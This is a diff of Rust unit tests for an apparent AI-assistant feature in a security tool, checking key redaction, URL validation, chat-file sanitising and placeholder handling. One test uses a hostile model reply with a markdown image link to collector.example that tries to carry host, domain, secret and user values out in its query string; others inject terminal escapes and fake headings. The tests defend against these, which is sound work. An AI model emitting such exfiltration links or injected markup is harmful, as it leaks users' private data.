+                   <img src=//collector.example/x>\n[r]: https://collector.example/\n\
+                   Use `curl -s https://10.10.10.5/ | head` and a < b."
+                .into(),
+            ..outcome.clone()
+        };
+        let dir = tempfile::tempdir().unwrap();
+        let path = append_chat(dir.path(), host, &hostile).unwrap();
+        let text = std::fs::read_to_string(&path).unwrap();
+        for live in ["![status](", "![m](", "<img", "\n[r]:"] {
+            assert!(!text.contains(live), "{live:?} in {text}");
+        }
+        assert!(text.contains("Use `curl -s https://10.10.10.5/ | head` and a < b."));
+    }
+
+    #[tokio::test]
+    async fn a_reply_cannot_take_private_values_out_through_a_link() {
+        if !no_env_key() {
+            return;
+        }
+        // A provider (or whatever the model read) answers with an image
+        // whose address is built from placeholders, some never sent.
+        const REPLY: &str = "Patch <<HOST_01>> now. \
+            ![status](https://collector.example/p.png?h=<<HOST_01>>&d=<<DOM_01>>&s=<<SEC_01>>&u=<<USER_01>>) \
+            and open https://<<HOST_01>>/admin";
+        let seen: Arc<Mutex<Vec<Value>>> = Arc::default();
+        let app = Router::new()
+            .route(
+                "/cloud/chat/completions",
+                post(|State(seen): State<Arc<Mutex<Vec<Value>>>>, Json(body): Json<Value>| async move {
+                    seen.lock().unwrap().push(body);
+                    sse(&[REPLY], None)
+                }),
+            )
+            .with_state(Arc::clone(&seen));
+        let listener = tokio::net::TcpListener::bind("127.0.0.1:0").await.unwrap();
+        let base = format!("http://{}", listener.local_addr().unwrap());
+        tokio::spawn(async move { axum::serve(listener, app).await.unwrap() });
+
+        let (engine, _db) = engine(&base, Some("sk-or-test"));
+        let graph = lab();
+        let vault = Mutex::new(Vault::ephemeral());
+        // A secret of another host is in the vault from an earlier request.
+        vault
+            .lock()
+            .unwrap()
+            .register(crate::vault::Kind::Sec, "hunter2-elsewhere");
+        let (outcome, _) = run(&engine, Tier::Cloud, &graph, &vault).await;
+        let outcome = outcome.unwrap();
+        assert!(
+            outcome.text.starts_with("Patch 10.10.10.5 now."),
+            "{}",
+            outcome.text
+        );
+        assert!(
+            outcome.text.ends_with("and open https://10.10.10.5/admin"),
+            "{}",
+            outcome.text
+        );
+        // Inside the link to elsewhere nothing was filled in.
+        assert!(outcome
+            .text
+            .contains("?h=<<HOST_01>>&d=<<DOM_01>>&s=<<SEC_01>>&u=<<USER_01>>)"));
+        for private in ["hunter2-elsewhere", "portal.corp-acme.com", SECRET_JWT] {
+            assert!(!outcome.text.contains(private), "{private}");
+        }
+        // And the saved reply holds no image at all.
+        let dir = tempfile::tempdir().unwrap();
+        let path = append_chat(dir.path(), &graph.hosts["10.10.10.5"], &outcome).unwrap();
+        let saved = std::fs::read_to_string(path).unwrap();
+        assert!(!saved.contains("![status]("), "{saved}");
+        assert!(saved.contains("!\\[status]\\(https://collector.example/p.png?h=<&lt;HOST_01>>"));
     }
 
     #[tokio::test]
@@ -1925,5 +3076,108 @@ mod tests {
         let (outcome, _) = run(&engine, Tier::Cloud, &graph, &vault).await;
         let err = format!("{:#}", outcome.unwrap_err());
         assert!(err.contains("must start with https://"), "{err}");
+    }
+
+    #[test]
+    fn debug_redacts_keys_and_chat_preserves_indentation_and_guards_windows_names() {
+        let settings = AiSettings {
+            openrouter_api_key: Some("sk-or-super-secret-value".into()),
+            ..AiSettings::default()
+        };
+        let dbg_settings = format!("{settings:?}");
+        assert!(!dbg_settings.contains("sk-or-super-secret-value"));
+        assert!(dbg_settings.contains("[REDACTED]"));
+
+        let overrides = AiOverrides {
+            api_key: Some("sk-ant-super-secret-value".into()),
+            ..AiOverrides::default()
+        };
+        let dbg_overrides = format!("{overrides:?}");
+        assert!(!dbg_overrides.contains("sk-ant-super-secret-value"));
+        assert!(dbg_overrides.contains("[REDACTED]"));
+
+        assert_eq!(chat_file_name("CON"), "_CON.md");
+        assert_eq!(chat_file_name("nul.local"), "_nul.local.md");
+        assert_eq!(chat_file_name("com1"), "_com1.md");
+        assert_eq!(chat_file_name("..."), "_host.md");
+
+        let dir = tempfile::tempdir().unwrap();
+        let graph = lab();
+        let host = &graph.hosts["10.10.10.5"];
+        let outcome = Outcome {
+            requested: Tier::Cloud,
+            tier: Tier::Local,
+            model: "local\x1b]0;pwn\x07\n## Fake".into(),
+            text: "```nginx\nserver {\n    server_tokens off;\n}\n```".into(),
+            cost_usd: 0.0,
+            web_search_requests: 0,
+            cached: false,
+            fallback_reason: Some("budget\n# Injected".into()),
+        };
+        let path = append_chat(dir.path(), host, &outcome).unwrap();
+        let written = std::fs::read_to_string(path).unwrap();
+        assert!(
+            written.contains("    server_tokens off;\n"),
+            "leading code indentation must be preserved:\n{written}"
+        );
+        assert!(!written.contains('\x1b'));
+        assert!(!written.contains("\n## Fake"));
+        assert!(!written.contains("\n# Injected"));
+    }
+
+    #[test]
+    fn ipv4_mapped_ipv6_loopback_stream_line_cap_and_negative_cost_guard() {
+        // IPv4-mapped IPv6 loopback must be treated as loopback, while unspecified 0.0.0.0/:: are rejected.
+        assert!(is_loopback_url("http://[::ffff:127.0.0.1]:1234/v1"));
+        assert!(!is_loopback_url("http://[::ffff:203.0.113.10]:1234/v1"));
+        assert!(validate_cloud_url("http://[::ffff:127.0.0.1]:8080/v1").is_ok());
+        assert!(validate_local_url("http://0.0.0.0:1234/v1").is_err());
+        assert!(validate_local_url("http://[::]:1234/v1").is_err());
+        assert!(validate_cloud_url("https://0.0.0.0/v1").is_err());
+        assert!(validate_local_url("http://192.168.1.50:1234/v1").is_ok());
+        assert!(validate_local_url("http://user:pass@127.0.0.1:1234/v1").is_err());
+
+        // Single-chunk SSE line exceeding MAX_STREAM_LINE with a trailing '\n' must still fail.
+        let mut lines = StreamLines::default();
+        let mut huge = vec![b'a'; MAX_STREAM_LINE + 64];
+        huge.push(b'\n');
+        lines.push(&huge).unwrap();
+        let line_err = format!("{:#}", lines.next_line().unwrap_err());
+        assert!(
+            line_err.contains("line longer than meow reads"),
+            "{line_err}"
+        );
+
+        // Negative or non-finite reported cost must never reduce spent_usd in budget tracking.
+        let neg = parse_usage(&json!({
+            "cost": -500.0,
+            "prompt_tokens": 10,
+            "completion_tokens": 20,
+            "server_tool_use": { "web_search_requests": u64::from(u32::MAX) + 99 }
+        }));
+        assert_eq!(neg.cost_usd, 0.0);
+        assert_eq!(neg.web_search_requests, u32::MAX);
+        assert!(Budget {
+            spent_usd: f64::NAN,
+            calls: 0,
+            max_usd: 1.0,
+            max_calls: 20,
+            has_key: true,
+        }
+        .exhausted());
+
+        // macOS lsof `-F u` parser extracts listener UIDs accurately.
+        assert_eq!(lsof_listener_uids("p1234\nu501\np5678\nu502\n"), [501, 502]);
+
+        // Broken ai.toml with an API key must never echo the key in the error message (ISS-029).
+        let dir = tempfile::tempdir().unwrap();
+        let path = dir.path().join("ai.toml");
+        crate::workspace::write_private_atomic(
+            &path,
+            b"api_key = \"sk-ant-top-secret-9999\" broken\n",
+        )
+        .unwrap();
+        let err = format!("{:#}", AiOverrides::load(&path).unwrap_err());
+        assert!(!err.contains("sk-ant-top-secret-9999"), "{err}");
     }
 }
